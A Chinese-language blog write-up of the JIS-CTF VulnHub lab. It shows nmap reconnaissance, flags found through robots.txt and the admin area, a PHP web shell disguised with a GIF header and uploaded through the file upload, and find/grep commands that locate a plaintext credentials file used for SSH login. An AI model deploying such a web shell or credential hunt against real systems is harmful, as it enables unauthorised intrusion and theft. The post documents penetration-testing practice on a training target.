---
layout: post
title: JIS-CTF
subtitle: JIS-CTF
date: 2023-07-07 16:25
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
published: true
---

## 环境搭建

[Vuluhub 靶场 IP 问题 - Kyon-H Blog](https://blog.kyon.xin/2025/07/01/Vuluhub%E9%9D%B6%E5%9C%BAIP%E9%97%AE%E9%A2%98/)

## 信息搜集

![Pasted%20image%2020250707170751.png](https://img.ghostliner.top/wqFpa0.png)

**发现主机：192.168.163.133**

```shell
nmap -T4 -A -p- 192.168.163.133
```

![Pasted%20image%2020250707170908.png](https://img.ghostliner.top/UVd7lU.png)

扫描站点发现`robots.txt`
![Pasted%20image%2020250707171104.png](https://img.ghostliner.top/G72JfN.png)

## 渗透测试

访问 flag 目录获取到 flag1
![Pasted%20image%2020250707171227.png](https://img.ghostliner.top/ntcdCN.png)

访问 admin_area，获取到 flag2 和 admin 密码
![Pasted%20image%2020250707180402.png](https://img.ghostliner.top/ii5xyJ.png)

登录成功，发现文件上传，尝试上传木马
![image.png](https://img.ghostliner.top/s1I617.png)

```php
GIF89a
<?php eval($_POST['code']);?>
```

上传成功，访问`/uploaded_files/shell.php`成功，蚁剑连接。
发现 flag.txt 为空，发现 hint.txt，获取到 flag3

![image.png](https://img.ghostliner.top/X0AV5L.png)

根据提示，发现 flag.txt 所属用户 `technawi`

![image.png](https://img.ghostliner.top/GJ4LGS.png)

找到该用户家目录，未发现

![image.png](https://img.ghostliner.top/qX3FEC.png)

```shell
find / -type f -name "*technawi*" 2>/dev/null # 未发现
grep -r technawi /etc/* 2>/dev/null
```

![image.png](https://img.ghostliner.top/mYqrAr.png)

查看 `/etc/mysql/conf.d/credentials.txt`, `technawi`, `3vilH@ksor`

![image.png](https://img.ghostliner.top/MV0Zgb.png)

ssh 登录，查看 `flag.txt`

![image.png](https://img.ghostliner.top/bkUWqU.png)
